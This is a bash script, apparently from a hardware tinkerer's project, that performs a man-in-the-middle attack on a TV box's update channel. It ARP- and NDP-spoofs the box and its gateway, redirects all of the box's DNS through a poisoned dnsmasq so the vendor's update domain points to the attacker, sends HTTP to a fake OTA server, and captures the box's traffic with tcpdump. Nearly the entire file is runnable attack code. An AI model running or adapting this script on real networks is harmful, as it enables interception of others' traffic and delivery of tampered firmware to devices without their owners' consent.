#!/bin/bash
# ota_poison.sh — MITM the box's OTA/upgrade channel: ARP+NDP spoof its gateway,
# hijack ALL its DNS (bestv.com.cn -> us), intercept its HTTP :80, log everything.
# Usage: sudo bash ~/tvbox/ssrf/ota_poison.sh [minutes]
set -u
BOX=192.0.2.125
BOX6=2408:8214:b43:2e90:a3e6:1c5e:8d31:e28f
BOX64=2408:8214:b43:2e90::/64
GW=192.0.2.1
RLLA=fe80::7686:6fff:fe50:67a3
IF=enp1s0
ME=192.0.2.220
MIN=${1:-20}
DIR=~/tvbox/ssrf

BOXMAC=$(awk -v i="$BOX" '$1==i {print $3; exit}' <(arp -n))
GWMAC=$(awk -v i="$GW" '$1==i {print $3; exit}' <(arp -n))
MYMAC=$(cat /sys/class/net/$IF/address)
if [ -z "$BOXMAC" ]; then ping -c2 -W1 $BOX >/dev/null 2>&1; BOXMAC=$(awk -v i="$BOX" '$1==i {print $3; exit}' <(arp -n)); fi
[ -z "$BOXMAC" ] && { echo "box not in ARP table, aborting"; exit 1; }
echo "box=$BOX/$BOXMAC gw=$GW/$GWMAC me=$MYMAC  running ${MIN}min"

echo 1 > /proc/sys/net/ipv4/ip_forward
echo 1 > /proc/sys/net/ipv6/conf/$IF/forwarding

# --- capture+serve rules, scoped to the box only ---
iptables -t nat -A POSTROUTING -s $BOX/32 -o $IF -j MASQUERADE
iptables -t nat -A PREROUTING -s $BOX/32 -p udp --dport 53 -j REDIRECT --to-ports 5353
iptables -t nat -A PREROUTING -s $BOX/32 -p tcp --dport 53 -j REDIRECT --to-ports 5353
iptables -t nat -A PREROUTING -s $BOX/32 -p tcp --dport 80 -j REDIRECT --to-ports 80
iptables -I FORWARD 1 -s $BOX -j ACCEPT
iptables -I FORWARD 1 -d $BOX -j ACCEPT
ip6tables -t nat -A PREROUTING -s $BOX64 -p udp --dport 53 -j REDIRECT --to-ports 5353 2>/dev/null
ip6tables -t nat -A PREROUTING -s $BOX64 -p tcp --dport 80 -j REDIRECT --to-ports 80 2>/dev/null
ip6tables -A POSTROUTING -s $BOX64 -o $IF -j MASQUERADE 2>/dev/null
ip6tables -I FORWARD 1 -s $BOX64 -j ACCEPT 2>/dev/null
ip6tables -I FORWARD 1 -d $BOX64 -j ACCEPT 2>/dev/null

cleanup() {
  echo; echo "[*] restoring..."
  kill $SP1 $SP2 $SP3 $DNS $OTA $TCP 2>/dev/null
  python3 $DIR/minispoof.py $IF $GWMAC $BOX $GW 4 &
  python3 $DIR/minispoof.py $IF $BOXMAC $GW $BOX 4 &
  wait 2>/dev/null
  iptables -t nat -D POSTROUTING -s $BOX/32 -o $IF -j MASQUERADE 2>/dev/null
  iptables -t nat -D PREROUTING -s $BOX/32 -p udp --dport 53 -j REDIRECT --to-ports 5353 2>/dev/null
  iptables -t nat -D PREROUTING -s $BOX/32 -p tcp --dport 53 -j REDIRECT --to-ports 5353 2>/dev/null
  iptables -t nat -D PREROUTING -s $BOX/32 -p tcp --dport 80 -j REDIRECT --to-ports 80 2>/dev/null
  iptables -D FORWARD -s $BOX -j ACCEPT 2>/dev/null
  iptables -D FORWARD -d $BOX -j ACCEPT 2>/dev/null
  ip6tables -t nat -D PREROUTING -s $BOX64 -p udp --dport 53 -j REDIRECT --to-ports 5353 2>/dev/null
  ip6tables -t nat -D PREROUTING -s $BOX64 -p tcp --dport 80 -j REDIRECT --to-ports 80 2>/dev/null
  ip6tables -D POSTROUTING -s $BOX64 -o $IF -j MASQUERADE 2>/dev/null
  ip6tables -D FORWARD -s $BOX64 -j ACCEPT 2>/dev/null
  ip6tables -D FORWARD -d $BOX64 -j ACCEPT 2>/dev/null
  pkill -f "dnsmasq -C $DIR/dnsmasq-poison.conf" 2>/dev/null
  echo "[*] done. requests: $DIR/ota_requests.log  dns: $DIR/dnsmasq.log  traffic: $DIR/poison_tcpdump.log"
  exit 0
}
trap cleanup INT TERM EXIT

timeout $((MIN*60)) python3 $DIR/minispoof.py $IF $MYMAC $BOX $GW 3600 & SP1=$!
timeout $((MIN*60)) python3 $DIR/minispoof.py $IF $MYMAC $GW $BOX 3600 & SP2=$!
timeout $((MIN*60)) python3 $DIR/ndpspoof.py $IF $MYMAC $BOX6 $RLLA 3600 & SP3=$!

dnsmasq -C $DIR/dnsmasq-poison.conf --user=root & DNS=$!
sleep 1
kill -0 $DNS 2>/dev/null || { echo "dnsmasq failed to start, see $DIR/dnsmasq.log"; }

timeout $((MIN*60)) python3 $DIR/ota_server.py 80 >>$DIR/ota_server.err 2>&1 & OTA=$!
timeout $((MIN*60)) tcpdump -i $IF -nn -l "( ether host $BOXMAC )" -A 2>/dev/null | stdbuf -oL cat > "$DIR/poison_tcpdump.log" &
TCP=$!

echo "[*] poisoned. On the box, open the upgrade page / press check-update now."
echo "[*] watch: tail ~/tvbox/ssrf/ota_requests.log"
wait $TCP
cleanup
